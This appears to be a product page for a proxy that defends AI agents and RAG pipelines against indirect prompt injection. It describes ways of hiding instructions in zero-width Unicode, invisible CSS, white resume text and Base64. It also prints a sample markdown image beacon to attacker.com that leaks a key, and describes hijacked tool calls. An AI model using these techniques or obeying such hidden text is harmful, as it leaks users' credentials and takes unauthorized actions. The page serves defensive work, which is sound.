The Multi-Modal Prompt Injection Crisis

Autonomous AI browser agents and RAG pipelines ingest untrusted external context without sanitization, leaving enterprises exposed to severe data exfiltration.

Invisible Attack Vectors
  • Zero-Width Unicode: Malicious directives encoded into invisible Unicode character streams that bypass standard word filters.
  • CSS Steganography: Micro-fonts (font-size:0px, opacity:0) and off-screen coordinates hidden from human eyes.
  • PyMuPDF Trojan Resumes: Malicious 1.0pt white ink embedded into job applicant resumes to manipulate ATS recruiting bots.
  • Encoded Smuggling: Base64 and HTML comments instructing agents to execute system commands.
Catastrophic Consequences
  • Silent Markdown Exfiltration: The agent appends an image beacon like ![verify](attacker.com/sink?leak=KEY) to leak private credentials via browser prefetching.
  • Autonomous Tool Hijacking: Agent fires unauthorized functions: send_offer_email(salary='$450k') or forwarding financial records.
  • The False-Positive Trap: Naive regex filters block legitimate developer specs containing keywords like mTLS, AES-256, and token.

3-Layer Defense-in-Depth Architecture

A transparent OpenAI-compatible proxy (http://localhost:8000/v1) that neutralizes indirect prompt injections in under 5 milliseconds.

Layer 1: Pre-Ingestion
Multi-modal content scrubber operating before tokens touch the LLM context window.
  • HTML DOM Parser: AST-level stripping of zero-width Unicode and hidden CSS styles.
  • PyMuPDF Vector Scanner: Analyzes font sizes & RGB contrast to purge white-on-white text.
  • Obfuscation Decoder: Recursive Base64/Hex scanner.
Overhead: ~1.2 ms
Layer 2: Semantic Guard
Cryptographic prompt fencing and zero-shot threat scoring.
  • Cryptographic Data-Marking: Wraps untrusted text in strict spotlighting nonces.
  • Semantic Threat Scorer: Fast 0–100% heuristic evaluating instruction override vectors.
  • Heal & Sanitize: Excises dangerous imperative spans while preserving benign context.
Overhead: ~0.6 ms
Layer 3: Egress & Taint
Provenance tracking and autonomous tool call gatekeeper.
  • Session Taint Engine: Tracks dirty inputs across multi-turn agent execution loops.
  • Markdown Image Filter: Strips stealthy exfiltration image tags before output renders.
  • Tool Call Gatekeeper: Quarantines sensitive functions for human verification.
Overhead: ~0.4 ms
